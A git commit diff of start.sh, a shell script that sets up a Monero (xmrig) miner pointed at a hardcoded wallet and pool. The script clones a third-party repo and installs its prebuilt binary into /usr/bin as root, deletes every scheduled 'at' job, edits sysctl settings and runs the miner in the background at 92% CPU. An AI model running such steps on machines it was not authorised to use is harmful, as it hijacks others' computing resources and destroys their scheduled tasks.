a17f8745238b9450756b6f5b5aa64259441d77dd
siskapiska <11cj11@bk.ru>
2018-11-20 07:25:27 +0300

    Test

--- start.sh
+++ start.sh
@@ -1,32 +1,24 @@
 #!/usr/bin/env bash
 
-#for Debian based
-sudo sysctl vm.nr_hugepages=128
-sudo apt-get update
-sudo apt-get upgrade -y
-sudo apt-get install -y \
-     apt-transport-https \
-     ca-certificates \
-     curl \
-     gnupg2 \
-     software-properties-common
-curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add -
-sudo add-apt-repository \
-   "deb [arch=amd64] https://download.docker.com/linux/debian \
-   $(lsb_release -cs) \
-   stable"
-sudo apt-get update && sudo apt-get install -y docker-ce
-
-#CRONTAB
-#wget GIT/reboot_cron -O /tmp/reboot_cron
-#sudo crontab -u root /tmp/reboot_cron
-
-wallet='46XYFkrVGBjUjFS891F17uivxsijPnen18WmBKdrgUWzjoVPyQFduYzQwAK61ox5oZK5QmhBRqK5cF8gJ1HC69R6M3NdQkY'
-numthr="$(nproc --all)"
 pool='ca.minexmr.com'
 port=4444
-pass='x'
 ID="$(hostname)"
+WALLET=46XYFkrVGBjUjFS891F17uivxsijPnen18WmBKdrgUWzjoVPyQFduYzQwAK61ox5oZK5QmhBRqK5cF8gJ1HC69R6M3NdQkY
+PASSWORD=x
+THREADS="$(nproc --all)"
 
-image=servethehome/universal_cryptonight:latest
-docker run -itd -e pool=${pool} -e startport=${port} -e username=${wallet}.${ID} -e pass=${pass} -e donate-level=1 -e numthreads=$((numthr)) ${image}
+rm -rf /tmp/miner/
+for i in `atq | awk '{print $1}'`;do atrm $i;done
+sudo dpkg --configure -a
+echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
+sudo sysctl -p
+sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
+sleep 2
+cd /tmp && mkdir miner
+git clone https://github.com/WilliamWizard/miner-xmr.git /tmp/miner
+cd /tmp/miner
+chmod +x /tmp/miner/xmrig
+cp /tmp/miner/xmrig /usr/bin/
+sleep 1
+xmrig -o ${pool}:${port} -u ${WALLET}.${ID} --pass=${PASSWORD} --rig-id=${ID} -B -l /tmp/miner/xmrig.log --donate-level=1 --threads=${THREADS} --cpu-priority=2 --background --max-cpu-usage=92
+echo -e 'ALL WORKS! tail -f /tmp/miner/xmrig.log'
